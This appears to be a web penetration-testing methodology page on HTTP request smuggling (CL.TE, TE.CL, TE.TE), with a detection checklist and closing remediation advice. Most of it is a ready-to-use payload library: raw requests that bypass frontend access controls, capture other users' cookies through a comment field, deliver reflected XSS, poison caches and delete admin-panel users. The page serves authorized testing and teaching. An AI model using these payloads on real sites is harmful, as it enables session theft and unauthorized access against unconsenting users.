---
title: " HTTP Request Smuggling (H1): CL.TE / TE.CL / TE.TE"
date: 2026-02-24
draft: false
---

#  HTTP Request Smuggling (H1): CL.TE / TE.CL / TE.TE

> **Severity**: Critical | **CWE**: CWE-444
> **OWASP**: A05:2021 – Security Misconfiguration
> **PortSwigger Research**: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

---

## What Is HTTP Request Smuggling?

Modern web architectures use a **chain of HTTP processors**: a frontend (CDN, load balancer, reverse proxy) that forwards requests to a backend server. These processors must agree on where each HTTP request ends and the next begins.

HTTP/1.1 allows two ways to specify body length:
- `Content-Length` (CL): explicit byte count
- `Transfer-Encoding: chunked` (TE): body terminated by a `0`-length chunk

When frontend and backend **disagree on which header to use**, an attacker can craft a request that the frontend sees as one request but the backend sees as two — "smuggling" a partial request that poisons the backend's request queue and affects the next legitimate user's request.

```
Frontend → sees: [Request A (complete)]
Backend  → sees: [Request A (partial)] + [smuggled prefix of Request B]
                                          ↑
                                       next user's request now has
                                       attacker's prefix prepended
```

---

## The Three Vulnerability Classes

### CL.TE — Frontend uses Content-Length, Backend uses Transfer-Encoding

```
Frontend: reads Content-Length → sends full body to backend
Backend:  reads Transfer-Encoding → interprets chunked encoding
          sees the smuggled suffix as the start of the next request
```

### TE.CL — Frontend uses Transfer-Encoding, Backend uses Content-Length

```
Frontend: reads Transfer-Encoding (chunked) → forwards chunks
Backend:  reads Content-Length → only consumes part of body
          remainder stays in buffer → prefixed to next request
```

### TE.TE — Both support Transfer-Encoding, one can be obfuscated

```
Obfuscate Transfer-Encoding so one processor ignores it
→ the ignoring processor falls back to Content-Length
→ creates CL.TE or TE.CL desync
```

---

## Discovery Checklist

### Phase 1 — Fingerprint Architecture

- [ ] Check for frontend proxy headers: `Via`, `X-Forwarded-For`, `X-Cache`, `CF-Ray`, `Server` (nginx vs Apache vs IIS)
- [ ] Check if server is behind Cloudflare, AWS ALB, HAProxy, nginx, Squid, Varnish
- [ ] Send `Transfer-Encoding: chunked` — does server handle it?
- [ ] Check if backend and frontend are different software (mismatch = potential desync)

### Phase 2 — Active Detection

- [ ] Use Burp HTTP Request Smuggler extension (automated detection)
- [ ] Test CL.TE: send request with both CL and TE (chunked) — timing/response difference?
- [ ] Test TE.CL: send chunked request with misleading CL — timing difference?
- [ ] Use time-delay technique: smuggle `GPOST / HTTP/1.1` — does second request timeout differently?
- [ ] Confirm with differential response: smuggle prefix that causes 404/redirect for next request
- [ ] Turn off auto-retry/keep-alive in Burp when testing

### Phase 3 — Exploit Impact

- [ ] Capture next user's request (steal cookies, tokens, POST bodies)
- [ ] Bypass frontend security controls (WAF, auth, IP allowlist)
- [ ] Poison the request queue for reflected XSS delivery
- [ ] Access restricted backend endpoints inaccessible to frontend users
- [ ] Cache poisoning via smuggled response

---

## Payload Library

> **CRITICAL**: All smuggling payloads require `\r\n` (CRLF) line endings.
> In Burp Repeater: tick "Update Content-Length" OFF. Use exact headers below.

### CL.TE Detection — Time Delay

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```

**Explanation**: Frontend sends full body (CL=4: `1\nZ\nQ`). Backend (TE chunked) reads chunk `1` byte = `Z`, then reads `Q` as start of next chunk and waits for the rest — causes **10s+ timeout** → CL.TE confirmed.

### CL.TE Detection — Differential Response

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling_test
0

GET /404smuggling HTTP/1.1
Foo: x
```

Send twice rapidly. Second request by another user is prefixed with `GET /404smuggling HTTP/1.1\r\nFoo: x` → returns 404 where they expected 200 → confirms CL.TE.

### TE.CL Detection — Time Delay

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

c2
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Explanation**: Frontend (TE chunked) forwards chunk `c2` hex = 194 bytes + terminator `0`. Backend (CL=4) reads only 4 bytes (`c2\r\n`) → remaining bytes stay in buffer → backend waits for next request data → **timeout** → TE.CL confirmed.

### TE.TE — Obfuscating Transfer-Encoding

When both frontend and backend support TE, obfuscate it so one ignores it:

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

1
Z
Q
```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: xchunked
```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: chunked
```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding:[\t]chunked
```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked[space]
```

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding
 : chunked
```

**Strategy**: Try each obfuscation. If one processor ignores the obfuscated TE, you get CL.TE or TE.CL behavior.

---

## Exploitation Techniques

### 1. Bypass Frontend Security Controls

Frontend may enforce auth, WAF rules, or IP restrictions before forwarding.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

When next legitimate request arrives, it's prefixed with the smuggled `GET /admin` → backend receives admin request that bypassed frontend's authorization check.

### 2. Capture Next User's Request (Cookie/Token Theft)

CL.TE capture attack — store next request in a comment parameter:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 249
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 900
Cookie: session=YOUR_VALID_SESSION

csrf=YOUR_CSRF&postId=5&name=Attacker&email=x@x.com&comment=
```

The next victim's full HTTP request (including their cookies, auth headers) gets appended to `comment=` → stored in the database → retrieve by reading the comment.

**The `Content-Length: 900` in the smuggled request must be large enough to capture the next request.**

### 3. Reflected XSS via Request Smuggling

Combine with a reflected XSS to deliver payload without a malicious link:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Transfer-Encoding: chunked

0

GET /page?param="><script>alert(1)</script> HTTP/1.1
X-Ignore: X
```

Next victim's request is prefixed → backend sees their request prefixed with the XSS URL → reflected XSS triggers in victim's browser.

### 4. Web Cache Poisoning via Smuggling

Poison a cacheable response so the cached XSS serves to all users:

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0

GET /static/js/app.js HTTP/1.1
Host: target.com
X-Ignore: x
```

If the static file is cacheable and the backend responds with the smuggled "second request" getting cached → every user who loads `/static/js/app.js` receives the poisoned response.

### 5. Bypass Access Controls to Admin Backend

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin/users/delete?username=carlos HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

The backend receives `GET /admin/users/delete` directly — the frontend's access control check (which only saw `POST /`) never applied to this inner request.

---

## Header Variations for TE.TE Bypass

Comprehensive list of `Transfer-Encoding` obfuscation techniques:

```
Transfer-Encoding: chunked
Transfer-Encoding: chunked[CR]         ← trailing carriage return
Transfer-Encoding: chunked [space]     ← trailing space
Transfer-Encoding: xchunked            ← invalid but some accept
Transfer-Encoding: Chunked             ← capital C
Transfer-Encoding: CHUNKED             ← all caps
Transfer-Encoding: chunked, identity   ← comma-separated
Transfer-Encoding: identity, chunked
Transfer-Encoding:chunked              ← no space after colon
Transfer-Encoding : chunked            ← space before colon
Transfer-Encoding[TAB]: chunked        ← tab in header name
[LF]Transfer-Encoding: chunked        ← newline prefix (header injection)
X-Custom: x\r\nTransfer-Encoding: chunked  ← CRLF injection into another header
```

---

## Burp Suite — Practical Testing Workflow

```bash
# 1. Install HTTP Request Smuggler extension:
#    Burp → Extensions → BApp Store → HTTP Request Smuggler

# 2. Basic detection:
#    Right-click any POST request → Extensions → HTTP Request Smuggler → Smuggle Probe

# 3. Manual testing in Repeater:
#    Repeater → [disable] Update Content-Length
#    Repeater → [disable] Normalize line endings to CRLF
#    Write payload with EXACT \r\n line endings (use Hex view to verify)

# 4. Turbo Intruder for timing attacks:
#    Right-click → Extensions → Turbo Intruder
#    Use parallel requests to trigger timing differences

# 5. HTTP Request Smuggler auto-exploit:
#    Burp → Smuggler → Select "CL.TE" or "TE.CL" → run against target

# Verify CRLF in Burp Repeater:
# Switch to "Hex" view → confirm 0D 0A at end of each line
# Switch to "Render" view — payloads must have exact header formatting
```

---

## Timing-Based Detection (Manual)

```
CL.TE timing:
  - Send request with conflicting headers, incomplete chunked body
  - Backend waits for next chunk → timeout after 10-30s
  - Normal request: <1s
  - If smuggling present: >10s → CONFIRM with differential test

TE.CL timing:
  - Frontend forwards chunks, backend reads CL (too short)
  - Remaining bytes buffered → backend waits for CL more bytes → timeout

Important: disable Burp's "auto-retry" when testing timing
           use a fresh connection per test to avoid contamination
           test from a single IP (don't use shared proxy)
```

---

## Detection with Automated Tools

```bash
# smuggler.py (standalone Python tool):
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u "https://target.com/" -v 2

# All methods:
python3 smuggler.py -u "https://target.com/" --verb POST -m CL.TE,TE.CL,TE.TE -v 2

# http-request-smuggling (Golang tool):
go install github.com/Shivangx01b/CL-TE-scanner@latest

# nuclei templates:
nuclei -t ~/nuclei-templates/vulnerabilities/other/http-request-smuggling.yaml \
       -u https://target.com

# Burp HTTP Request Smuggler — most comprehensive:
# Tested against: nginx, Apache, HAProxy, Squid, Varnish, AWS ALB, Cloudflare
```

---

## Remediation Reference

- **Normalize ambiguous requests**: frontend should reject or normalize requests with both `Content-Length` and `Transfer-Encoding` headers
- **Disable `Transfer-Encoding: chunked`** on frontend if not required
- **Use HTTP/2 end-to-end**: HTTP/2 does not have this ambiguity — HTTP/2 to backend eliminates H1 desync
- **Backend should reject invalid chunked encoding**: ambiguous bodies should return 400
- **Configure HAProxy/nginx** to strip `Transfer-Encoding` before forwarding, or to reject conflicting headers
- **Keep-alive vs close**: using `Connection: close` reduces multi-request contamination window

*PortSwigger Research: https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn*
*Part of the Web Application Penetration Testing Methodology series.*
